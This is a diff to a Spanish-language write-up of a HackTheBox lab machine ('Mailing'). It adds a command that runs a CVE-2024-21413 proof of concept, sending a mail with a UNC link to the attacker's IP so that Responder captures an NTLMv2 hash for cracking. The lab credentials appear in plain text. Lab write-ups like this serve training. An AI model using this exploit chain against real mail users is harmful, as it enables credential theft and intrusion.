@@ -104,6 +104,10 @@ con estas credenciales vamos a intentar una conexión vía telnet al puerto 110
 ### Responder
 despues de investigar un poco hemos encontrado el usuario administrator el cual nos permite ejecutar el siguiente `POC`
 `Esta CVE nos permite enviar un correo electronico y con el responder vamos a estar a la escucha para poder obtener un hash NTLMv2 el cual podemos crackear`
+
+```python
+python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\10.10.14.71\test\meeting" --subject "XD
+```
 ![[Pasted image 20240611204253.png]]
 
 `crackeamos el hash NTLMv2 con john`
